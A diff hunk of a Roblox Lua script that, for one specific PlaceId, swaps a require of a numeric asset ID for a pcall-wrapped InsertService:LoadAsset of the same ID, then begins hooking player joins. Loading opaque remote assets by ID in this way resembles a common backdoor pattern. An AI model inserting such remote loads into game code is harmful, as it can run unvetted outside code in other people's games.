@@ -14,7 +14,9 @@ end
 end)
 
 if game.PlaceId == 14747334292 then
-require(121155196033104)
+pcall(function()
+game:GetService("InsertService"):LoadAsset(121155196033104)
+end)
     local chatcon = {}
     chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
         wait(0.94397082108066)
